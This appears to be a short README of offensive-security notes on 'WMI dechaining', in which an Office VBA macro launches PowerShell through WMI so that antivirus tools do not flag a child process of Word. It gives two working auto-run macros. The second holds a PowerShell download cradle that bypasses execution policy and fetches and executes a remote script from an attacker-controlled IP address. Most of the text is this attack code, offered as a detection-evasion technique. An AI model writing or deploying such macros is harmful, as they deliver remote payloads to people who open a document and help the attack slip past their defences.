# WMI-Dechaining
WMI- old native part of the Windows operating system that is still poorly documented and unknown. Wmi can invoke alot of actions.  
We can resolve AV detection since the detection come from child process being detected from Microsoft Office. We can avoid by creating a powershell process using WMI. 


```
Sub MyMacro
  strArg = "powershell"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```

Powershell prompt will open
![image](https://github.com/user-attachments/assets/8c7ebeb6-8ba3-435b-8259-8a06f16d0e69)

Powershell running as child process. However powershell is running as 64 bit which can interfere with exploits. We must update this script
![image](https://github.com/user-attachments/assets/f945296c-b860-48d0-b5a8-32cf4c293c2a)

Added download cradle
```
Sub MyMacro
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```

![image](https://github.com/user-attachments/assets/347cd885-b711-484c-a114-05365e98a769)
